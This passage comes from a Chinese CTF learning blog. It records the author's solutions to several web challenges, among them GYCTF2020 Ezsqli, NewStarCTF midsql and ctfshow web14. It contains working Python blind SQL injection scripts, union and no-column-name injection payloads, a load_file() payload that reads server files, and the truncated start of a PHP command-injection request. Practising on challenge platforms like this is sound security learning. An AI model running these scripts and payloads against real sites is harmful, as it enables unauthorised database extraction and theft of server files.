class="hljs-comment">#         break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    time.sleep(<span class="hljs-number">0.05</span>) <br>    payload = <span class="hljs-string">&quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(l)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表名长度:&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;全表名长度:&quot;</span>,l)<br>        <span class="hljs-keyword">break</span> <br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,l+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        time.sleep(<span class="hljs-number">0.05</span>) <br>        payload = <span class="hljs-string">&quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name + s<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表名:&quot;</span>,name)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>到求列名，因为information_schema被过滤，sys.schema_table_statistics_with_buffer又并没有储存列名，并且这里过滤了 union 所以我们无法使用常规的<strong>无列名注入</strong><br>如</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>;<br></code></pre></td></tr></table></figure>
<p>更详细<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_71467825/article/details/134655702">https://blog.csdn.net/qq_71467825/article/details/134655702</a></p>
<p>先判断表的列数</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">1</span>&amp;&amp;((<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>) &gt; (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure>
<p>知道列数为2，那第一列大概率是id或序列号啥的，猜测flag在2  </p>
<p>为什么不能直接用盲注呢，应该是以为没法用selec group_concat(列名)，因为没有能查列名的表，所以不知道列名。</p>
<p>那看大佬们的wp，就是用比大小，ascii码大的就大。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> &quot;a&quot;)  <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> &quot;abcdef&quot;)<br> <br><span class="hljs-number">0</span><br> <br> <br> <br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> &quot;b&quot;)  <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> &quot;abcdef&quot;)<br> <br><span class="hljs-number">1</span><br> <br>这里能发现 是通过比对 首个字符的ascii 如果相同 就输出 <span class="hljs-number">0</span> <br><br>不同就输出 <span class="hljs-number">1</span><br> 前一个 ascii  和 后一个ascii 值的大小<br> 如果前一个比较大 那么就输出<span class="hljs-number">0</span><br><br>https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>kinsey973.github.io<span class="hljs-operator">/</span><span class="hljs-number">2024</span><span class="hljs-operator">/</span><span class="hljs-number">06</span><span class="hljs-operator">/</span><span class="hljs-number">08</span><span class="hljs-operator">/</span>GYCTF2020<span class="hljs-operator">-</span>Ezsqli<span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure>
<p>利用该方法拿到flag</p>
<p>最后的脚本又写了一个小时，想死了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&#x27;</span><br>url = <span class="hljs-string">&#x27;http://39c20ccd-935c-44d7-9446-f5fb806c3f12.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># for l in range (1,100):</span><br><span class="hljs-comment">#     payload = &#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;testing 数据库长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;数据库长度:&quot;,l)</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;表名长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;全表名长度:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;表名:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>):<br>    f=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.08</span>)<br>        f=flag + <span class="hljs-built_in">chr</span>(s)<br>        payload = <span class="hljs-string">&#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="hljs-built_in">format</span>(f)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag=flag + <span class="hljs-built_in">chr</span>(s-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag.lower)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>最后出来的flag全是大写，我看别人的wp也是大写要转小写，不知道什么原因</p>
<p>结束  </p>
<p>一道题看着别人的wp复现了近3个半小时，菜的发瘟，写脚本脑子跟不上，做题起步难没经验，到底哪天能独立解出一道这种web题啊<br>&#x2F;&#x2F;<br>&#x2F;&#x2F;<br>&#x2F;&#x2F;</p>
<p>复现的wp:<br><a target="_blank" rel="noopener" href="https://kinsey973.github.io/2024/06/08/GYCTF2020-Ezsqli/">https://kinsey973.github.io/2024/06/08/GYCTF2020-Ezsqli/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/upfine/p/16556520.html">https://www.cnblogs.com/upfine/p/16556520.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1/article/details/115447291">https://blog.csdn.net/fmyyy1/article/details/115447291</a></p>
<hr>
<h2 id="title-note-22date-2025-04-09-15-53-17tags-sql"><a href="#title-note-22date-2025-04-09-15-53-17tags-sql" class="headerlink" title="title: note-22date: 2025-04-09 15:53:17tags: sql"></a>title: note-22<br>date: 2025-04-09 15:53:17<br>tags: sql</h2><h1 id="NewStarCTF-2023-公开赛道-midsql"><a href="#NewStarCTF-2023-公开赛道-midsql" class="headerlink" title="[NewStarCTF 2023 公开赛道]midsql"></a>[NewStarCTF 2023 公开赛道]midsql</h1><p>看了wp，只能说fuzz过程应该是最重要的，不然fuzz都fuzz不明白完全不知道下一步该干嘛<br>也许我记得一些注入方法，但是如果连注入点或者注入方式都fuzz不出来也是完全没用<br>看了wp后发现原理都懂，那为什么总是要看wp才能写出题目？<br>就是不会fuzz，<br>自己写的脚本：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>start=<span class="hljs-number">0</span><br>end=<span class="hljs-number">0</span><br>using=<span class="hljs-number">0</span><br>st = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&amp;\()*&#x27; +,-./:;&quot;</span><br>flag =<span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&quot;http://9f146922-110f-45e5-a8b6-4b6fffbce466.node5.buuoj.cn:81/?id=&#x27;if(length(database())like(&#123;&#125;),sleep(3),1)&quot;</span><br><span class="hljs-comment"># for l in range (1,200):</span><br><span class="hljs-comment">#     url = &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(length(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_name/**/like&#x27;items&#x27;)like/**/&#123;&#125;,sleep(3),1)&quot;.format(l)</span><br><span class="hljs-comment">#     start=time.time()</span><br><span class="hljs-comment">#     requests.get(url)</span><br><span class="hljs-comment">#     end=time.time()</span><br><span class="hljs-comment">#     using = end - start</span><br><span class="hljs-comment">#     if using &gt; 3:</span><br><span class="hljs-comment">#         print(&quot;tables length=&quot;,l,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#         time.sleep(5)</span><br><span class="hljs-comment">#         break</span><br><span class="hljs-comment">#     print(&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#     time.sleep(0.05)</span><br><br><span class="hljs-comment"># for i in range(1,100):</span><br><span class="hljs-comment">#     for s in st :</span><br><span class="hljs-comment">#         url= &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like&#x27;items&#x27;),&#123;&#125;,1)like(&#x27;&#123;&#125;&#x27;),sleep(3),1)&quot;.format(i,s)</span><br><span class="hljs-comment">#         start=time.time()</span><br><span class="hljs-comment">#         requests.get(url)</span><br><span class="hljs-comment">#         end=time.time()</span><br><span class="hljs-comment">#         using= end - start</span><br><span class="hljs-comment">#         if using &gt; 3:</span><br><span class="hljs-comment">#             flag=flag + s</span><br><span class="hljs-comment">#             print(&quot;tables name=&quot;,flag,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#             r=1</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         print(&quot;using time=&quot;,using,&quot;string:&quot;,s)</span><br><span class="hljs-comment">#         time.sleep(0.05)</span><br><span class="hljs-comment">#         print(flag)</span><br><span class="hljs-comment">#         r=0</span><br><span class="hljs-comment">#     if r == 0:</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment">#id,name,price</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">177</span>) :<br>        url= <span class="hljs-string">&quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(ascii(substr((select/**/group_concat(name)/**/from/**/items),&#123;&#125;,1))like(&#x27;&#123;&#125;&#x27;),sleep(2),1)&quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        start=time.time()<br>        requests.get(url)<br>        end=time.time()<br>        using= end - start<br>        <span class="hljs-keyword">if</span> using &gt; <span class="hljs-number">3</span>:<br>            flag=flag + <span class="hljs-built_in">chr</span>(s)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tables name=&quot;</span>,flag,<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;number string:&quot;</span>,i)<br>            r=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;string:&quot;</span>,<span class="hljs-built_in">chr</span>(s))<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>        r=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> r == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<p>参考wp:  <a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/134096958">https://blog.csdn.net/Myon5/article/details/134096958</a></p>
<hr>
<h2 id="title-note-23date-2025-04-10-19-47-02tags-刷题note"><a href="#title-note-23date-2025-04-10-19-47-02tags-刷题note" class="headerlink" title="title: note-23date: 2025-04-10 19:47:02tags: 刷题note"></a>title: note-23<br>date: 2025-04-10 19:47:02<br>tags: 刷题note</h2><h1 id="ctfshow-web14"><a href="#ctfshow-web14" class="headerlink" title="ctfshow_web14"></a>ctfshow_web14</h1><p>一开始也试了传c，但是就试到2，然后以为是源码绕过的，看wp发现是sql注入。<br>再试到3就能自己发现这个页面了，，，，，，，，<br>&#x2F;here_1s_your_f1ag.php<br>按f12发现：  </p>
<blockquote>
<p>if(preg_match(‘&#x2F;information_schema.tables|information_schema.columns|linestring| |polygon&#x2F;is’, $_GET[‘query’])){<br>die(‘@A@’);  </p>
</blockquote>
<p>禁用了information_schema猜是无列名注入</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">database</span>()<br><br><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>
<p>字符注入</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-keyword">order</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
<p>试出是字符注入</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>@@<span class="hljs-keyword">version</span><br><br>//alert(<span class="hljs-string">&#x27;10.2.26-MariaDB-log&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<br>//alert(<span class="hljs-string">&#x27;gtid_slave_pos,content&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(*)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>gtid_slave_pos<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file<span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure>
<p>试一下无列名注入</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>#<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span><br><br>//回显(<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>)无果<br></code></pre></td></tr></table></figure>
<p>看wp:<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55923820/article/details/118783171">https://blog.csdn.net/m0_55923820/article/details/118783171</a><br>原来sql还能加载文件<br>学到了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/var/www/html/secret.php&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/tmp/gtf1y&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/tmp/gtf1y/real_flag_is_here&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span>)<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>没想到是直接访问<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>alert(<span class="hljs-string">&#x27;ctfshow&#123;dd04abdc-9d55-4d0d-8d2d-f616f7b82caa&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure>


<p>有无列明注入的版本wp，但我在我的环境没试出来：<br><a target="_blank" rel="noopener" href="https://www.zxcms.com/content/3fcqbuf331l6p0.html">https://www.zxcms.com/content/3fcqbuf331l6p0.html</a></p>
<h1 id="ctfshow-红包题第二弹"><a href="#ctfshow-红包题第二弹" class="headerlink" title="ctfshow 红包题第二弹"></a>ctfshow 红包题第二弹</h1><p>这题有点牛逼了  </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wssw/p/18115718">https://www.cnblogs.com/wssw/p/18115718</a><br>前面的?&gt;意思是闭合前面的语句。<br>&lt;?&#x3D;是echo()的别名用法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /?cmd=?%3E%3C?=<span class="hljs-string">`.%20/??p/p?p??????`</span>; <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: 6fd1fc97-dca5-4a94-<span class="hljs-number">8065</span>-2622d4c7ed8d.<span 